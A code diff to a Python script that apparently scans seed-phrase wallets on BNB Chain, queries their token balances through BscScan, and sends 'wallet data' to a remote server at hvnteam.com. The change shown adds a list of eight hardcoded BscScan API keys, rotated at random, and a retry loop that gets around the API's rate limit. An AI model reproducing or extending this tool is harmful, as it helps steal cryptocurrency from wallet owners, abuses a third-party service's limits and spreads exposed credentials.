@@ -6,6 +6,7 @@ from mnemonic import Mnemonic
 from eth_account import Account
 from web3 import Web3
 import time
+import random
 
 # Enable mnemonic support for eth_account
 Account.enable_unaudited_hdwallet_features()
@@ -16,6 +17,18 @@ web3 = Web3(Web3.HTTPProvider(bsc_rpc_url))
 
 # API to send wallet data to server
 api_url = 'https://hvnteam.com/wallet.php'  # Replace YOUR_SERVER_IP with your server's IP
+
+# List of API keys
+api_keys = [
+    '5PKUXSIHGB922PM6XIT58SNERBQ42KCMTB',
+'6PVT836Y1MCKJRPRU25QXEM3ITK2UR371Z',
+'6XSMT4EF2UJEI4KTPDNHEAN1Z31HSGSYV9',
+'W9KY993EIX9TZFYP4I1T3H28ZTGP8WGH4W',
+'CN5B61Z7PVDX4UJAX6WJAEUR8T1QG2TWSW',
+'BM9QQHCZWS6V79WKIK778YTE4D1AQM3I68',
+'7TSBZFKP5I4RA87PSUH1A5H8G3RKB7QDY3',
+'V19IR9GJYWUNY7RIFZ5CU3BJWXQ1CYUQT8'
+]
 
 def scan_wallet():
     try:
@@ -61,35 +74,46 @@ def scan_wallet():
 # Retrieve all tokens from the wallet
 def get_all_tokens(address):
     tokens = {}
-    api_key = '6PVT836Y1MCKJRPRU25QXEM3ITK2UR371Z'  # Replace with your BscScan API Key
-    url = f'https://api.bscscan.com/api?module=account&action=tokentx&address={address}&apikey={api_key}'
 
-    try:
-        response = requests.get(url, timeout=10)
-        data = response.json()
+    while True:
+        # Randomly select an API key
+        api_key = random.choice(api_keys)
+        url = f'https://api.bscscan.com/api?module=account&action=tokentx&address={address}&apikey={api_key}'
 
-        if data.get('status') == '0':
-            # Handle API errors or invalid responses
-            message = data.get('message', 'Unknown error')
-            if "Invalid API Key" in message:
-                print(f"[ERROR] Invalid API Key: {message}")
-            elif "Invalid address format" in message:
-                print(f"[ERROR] Invalid address format: {message}")
-            elif "No transactions found" in message:
-                print(f"[INFO] No transactions found for address {address}")
-            else:
-                print(f"[ERROR] API returned an unknown error: {message}")
-            return tokens
+        try:
+            response = requests.get(url, timeout=10)
+            data = response.json()
 
-        if data.get('status') == '1' and len(data.get('result', [])) > 0:
-            for tx in data['result']:
-                token_name = tx['tokenName']
-                if token_name not in tokens:
-                    tokens[token_name] = 0
-                tokens[token_name] += float(tx.get('value', 0)) / (10 ** int(tx.get('tokenDecimal', 18)))
+            if data.get('status') == '0':
+                message = data.get('message', '')
+                if "Max calls per sec rate limit reached" in message:
+                    print(f"[WARNING] API rate limit hit, retrying with another key...")
+                    time.sleep(0.5)
+                    continue
+                elif "Invalid API Key" in message:
+                    print(f"[ERROR] Invalid API Key: {message}")
+                    return tokens
+                elif "Invalid address format" in message:
+                    print(f"[ERROR] Invalid address format: {message}")
+                    return tokens
+                elif "No transactions found" in message:
+                    print(f"[INFO] No transactions found for address {address}")
+                    return tokens
+                else:
+                    print(f"[ERROR] API returned an unknown error: {message}")
+                    return tokens
 
-    except Exception as e:
-        print(f"[ERROR] Error retrieving tokens: {e}")
+            if data.get('status') == '1' and len(data.get('result', [])) > 0:
+                for tx in data['result']:
+                    token_name = tx['tokenName']
+                    if token_name not in tokens:
+                        tokens[token_name] = 0
+                    tokens[token_name] += float(tx.get('value', 0)) / (10 ** int(tx.get('tokenDecimal', 18)))
+
+            break
+
+        except Exception as e:
+            print(f"[ERROR] Error retrieving tokens: {e}")
 
     return {k: v for k, v in tokens.items() if v > 0}
 
